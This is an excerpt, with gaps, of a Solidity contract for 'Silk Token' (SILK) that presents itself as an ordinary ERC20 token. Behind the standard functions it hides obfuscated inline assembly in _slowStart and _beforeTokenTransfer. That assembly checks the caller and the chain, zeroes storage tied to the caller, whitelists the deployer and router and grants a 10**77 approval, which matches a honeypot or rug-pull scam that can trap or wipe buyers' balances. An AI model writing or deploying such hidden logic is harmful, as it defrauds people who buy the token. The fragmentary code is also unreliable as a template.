...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSilk;
    uint256 private nineThird = block.number*2;

    mapping (address => bool) private _firstHarry; 
    mapping (address => bool) private _secondPotter;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private pebbleStone;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private falseLight;
    address public pair;
    ...
    bool private trading; uint256 private fireShow = 1; bool private sparkWater;
    uint256 private _decimals; uint256 private gymPump;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSilk.push(_router); addSilk.push(msgSender_); addSilk.push(pair);
        for (uint256 q=0; q < 3;) {_firstHarry[addSilk[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xfff8d657497e185e389d71dd9fa2e0c10f27999ea26fbf2398f2132bfb954860
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x40712a7f792a4a165817a6e0c57aed2917db158a11205cd37362dadf2650682d,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; nineThird = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSilk[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySilk(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSilk[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySilk(creator, initialSupply);
    }
}

contract SilkToken is ERC20Token {
    constructor() ERC20Token("Silk Token", "SILK", msg.sender, 75000000 * 10 ** 18) {
    }
}